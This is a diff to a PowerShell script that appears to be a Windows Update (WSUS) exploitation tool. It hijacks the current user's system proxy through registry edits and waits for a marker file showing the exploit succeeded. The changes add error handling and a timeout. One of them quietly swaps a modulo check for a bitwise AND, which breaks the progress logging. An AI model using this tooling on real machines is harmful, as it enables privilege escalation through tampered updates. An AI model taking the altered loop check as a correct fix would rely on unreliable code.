@@ -77,9 +77,14 @@ function Set-SystemProxy {
 
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 
-    # Backup
-    $script:BackupProxyEnable = (Get-ItemProperty -Path $regPath).ProxyEnable
-    $script:BackupProxyServer = (Get-ItemProperty -Path $regPath).ProxyServer
+    # Backup (with error handling for non-existent keys)
+    try {
+        $script:BackupProxyEnable = (Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue).ProxyEnable
+        $script:BackupProxyServer = (Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue).ProxyServer
+    } catch {
+        $script:BackupProxyEnable = 0
+        $script:BackupProxyServer = $null
+    }
 
     # Set proxy
     Set-ItemProperty -Path $regPath -Name "ProxyEnable" -Value 1
@@ -91,14 +96,17 @@ function Set-SystemProxy {
 function Remove-SystemProxy {
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 
-    if ($null -ne $script:BackupProxyEnable) {
-        Set-ItemProperty -Path $regPath -Name "ProxyEnable" -Value $script:BackupProxyEnable
+    try {
+        if ($null -ne $script:BackupProxyEnable) {
+            Set-ItemProperty -Path $regPath -Name "ProxyEnable" -Value $script:BackupProxyEnable -ErrorAction SilentlyContinue
+        }
+        if ($null -ne $script:BackupProxyServer) {
+            Set-ItemProperty -Path $regPath -Name "ProxyServer" -Value $script:BackupProxyServer -ErrorAction SilentlyContinue
+        }
+        Write-Log "System proxy restored" Green
+    } catch {
+        Write-Log "Warning: Could not fully restore proxy settings" Yellow
     }
-    if ($null -ne $script:BackupProxyServer) {
-        Set-ItemProperty -Path $regPath -Name "ProxyServer" -Value $script:BackupProxyServer
-    }
-
-    Write-Log "System proxy restored" Green
 }
 
 function Start-WindowsUpdate {
@@ -568,7 +576,10 @@ try {
 
     # Monitor for success
     $checkCount = 0
-    while ($true) {
+    $maxWaitSeconds = 600
+    $startTime = Get-Date
+
+    while ((((Get-Date) - $startTime).TotalSeconds -lt $maxWaitSeconds)) {
         Start-Sleep -Seconds 5
         $checkCount++
 
@@ -584,9 +595,14 @@ try {
             break
         }
 
-        if ($checkCount % 6 == 0) {
+        if (($checkCount -band 6) -eq 0) {
             Write-DebugLog "Still waiting... ($($checkCount * 5) seconds elapsed)"
         }
+    }
+
+    if (-not (Test-Path "C:\wsuspicious.was.here")) {
+        Write-Log "Timeout reached after $maxWaitSeconds seconds" Yellow
+        Write-Log "Exploit may have failed or needs more time" Yellow
     }
 
 } catch {
